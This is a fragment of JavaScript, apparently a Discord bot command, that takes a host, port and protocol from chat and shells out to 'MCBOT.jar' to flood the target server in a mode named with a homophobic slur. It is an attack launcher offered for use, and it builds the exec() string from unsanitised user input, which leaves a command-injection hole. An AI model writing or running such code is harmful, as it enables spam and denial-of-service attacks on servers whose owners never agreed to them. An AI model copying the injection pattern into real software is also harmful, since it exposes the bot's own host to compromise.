...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('Commands')
	.setDescription("`attack command $gayspam <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}
...
if(!args[1]) {
	...
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$gayspam <Host> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}
...
exec(`java -jar MCBOT.jar ${host}:${port} ${protocol} gayspam 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
